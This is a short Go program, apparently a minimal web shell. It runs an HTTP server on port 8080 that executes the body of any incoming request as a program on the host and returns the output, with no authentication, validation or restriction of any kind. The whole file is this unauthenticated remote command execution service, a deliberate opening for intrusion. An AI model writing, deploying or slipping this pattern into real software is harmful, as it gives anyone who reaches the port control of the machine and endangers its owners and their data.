package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
)

func RunCommand(res http.ResponseWriter, req *http.Request) {
	defer req.Body.Close()
	command, _ := ioutil.ReadAll(req.Body)
	var outBuffer bytes.Buffer
	cmd := exec.Command(string(command))
	cmd.Stdin = os.Stdin
	cmd.Stdout = &outBuffer
	err := cmd.Run()
	if err != nil {
		fmt.Fprintf(res, err.Error())
	}
	fmt.Fprintf(res, outBuffer.String())
}

func main() {
	http.HandleFunc("/", RunCommand)
	http.ListenAndServe(":8080", nil)
}
